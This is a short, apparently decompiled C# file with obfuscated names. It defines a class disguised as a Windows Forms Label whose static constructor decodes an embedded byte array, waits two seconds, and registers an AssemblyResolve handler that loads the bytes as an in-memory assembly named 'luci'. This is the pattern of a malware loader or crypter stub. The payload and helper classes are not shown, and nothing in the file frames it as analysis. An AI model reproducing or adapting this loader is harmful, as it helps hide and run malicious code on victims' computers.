using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace x;

internal sealed class G : Label
{
	[CompilerGenerated]
	private sealed class T
	{
		public byte[] T;

		internal Assembly P(object object_0, ResolveEventArgs resolveEventArgs_0)
		{
			AppDomain appDomain = (AppDomain)object_0;
			if (resolveEventArgs_0.Name.Contains("luci"))
			{
				return appDomain.Load(T);
			}
			return null;
		}
	}

	static G()
	{
		byte[] T = smethod_0(M.smethod_1());
		M.smethod_0(2000L);
		AppDomain.CurrentDomain.AssemblyResolve += delegate(object object_0, ResolveEventArgs resolveEventArgs_0)
		{
			AppDomain appDomain = (AppDomain)object_0;
			return resolveEventArgs_0.Name.Contains("luci") ? appDomain.Load(T) : null;
		};
	}

	public static byte[] smethod_0(byte[] byte_0)
	{
		B.smethod_0(byte_0);
		return byte_0;
	}

	[STAThread]
	public static void Main()
	{
		N.smethod_0();
	}
}
